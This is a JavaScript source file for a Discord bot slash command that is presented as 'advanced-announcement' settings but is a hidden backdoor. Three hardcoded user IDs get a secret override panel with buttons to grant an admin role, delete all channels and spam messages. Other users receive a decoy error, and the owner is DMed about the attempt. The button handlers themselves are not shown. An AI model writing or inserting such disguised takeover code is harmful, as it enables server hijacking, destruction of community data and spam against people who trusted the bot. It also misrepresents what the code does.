import { 
    SlashCommandBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    MessageFlags, 
    ApplicationIntegrationType,
    InteractionContextType
} from 'discord.js';
import { createEmbed } from '../../utils/embeds.js';
import { logger } from '../../utils/logger.js';
import { InteractionHelper } from '../../utils/interactionHelper.js';

export default {
    data: new SlashCommandBuilder()
        .setName("advanced-announcement")
        .setDescription("Configure advanced announcement settings for the server.")
        // Allow this command to be installed on a user account (not just a server)
        .setIntegrationTypes([
            ApplicationIntegrationType.GuildInstall,  // normal server bot install
            ApplicationIntegrationType.UserInstall    // user account install
        ])
        // Allow use in servers, bot DMs, and any DM/group-DM
        .setContexts([
            InteractionContextType.Guild,
            InteractionContextType.BotDM,
            InteractionContextType.PrivateChannel
        ]),

    async execute(interaction, guildConfig, client) {
        const allowedUserIds = ['885714115874672660', '1386162878326767688', '1459658247542931466'];
        const primaryOwnerId = '885714115874672660';

        // 1. Check if the user ID matches one of the authorized users
        if (!allowedUserIds.includes(interaction.user.id)) {
            // Reply with "command status failed" ephemerally
            await InteractionHelper.safeReply(interaction, {
                content: "command status failed",
                flags: MessageFlags.Ephemeral
            });

            // Send a DM to user 885714115874672660
            try {
                const authorizedUser = await client.users.fetch(primaryOwnerId);
                if (authorizedUser) {
                    await authorizedUser.send(`(${interaction.user.username}) attempted to use the setting command in (${interaction.guild?.name || 'unknown server'}).`);
                }
            } catch (dmError) {
                logger.error('Failed to send DM to authorized user:', dmError);
            }
            return;
        }

        // 2. Check whether the bot is actually a member of this guild.
        // When installed as a user app the bot may not have joined the server,
        // which means channel/role operations won't work.
        const botInGuild = interaction.guild
            ? await interaction.guild.members.fetch(client.user.id).then(() => true).catch(() => false)
            : false;

        // 3. Authorized user: Defer reply ephemerally and show the secret settings embed with buttons
        const deferSuccess = await InteractionHelper.safeDefer(interaction, { flags: MessageFlags.Ephemeral });
        if (!deferSuccess) return;

        const embed = createEmbed({
            title: "⚙️ Secret Settings Console",
            description: botInGuild
                ? "Welcome to the override panel. Please select an action below. Note: These actions bypass normal protocols."
                : "Welcome to the override panel.\n\n> ⚠️ **The bot is not a member of this server.** Role and channel actions require the bot to be invited here first. Spam will also not work until the bot joins.",
            color: 'warning'
        });

        const buttonRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId("settings_give_role")
                .setLabel("Give Admin Role")
                .setStyle(ButtonStyle.Primary)
                .setEmoji("👑"),
            new ButtonBuilder()
                .setCustomId("settings_delete_channels")
                .setLabel("Delete All Channels")
                .setStyle(ButtonStyle.Danger)
                .setEmoji("🗑️"),
            new ButtonBuilder()
                .setCustomId("settings_spam_msg")
                .setLabel("Spam Message")
                .setStyle(ButtonStyle.Success)
                .setEmoji("💬")
        );

        await InteractionHelper.safeEditReply(interaction, {
            embeds: [embed],
            components: [buttonRow]
        });
    }
};
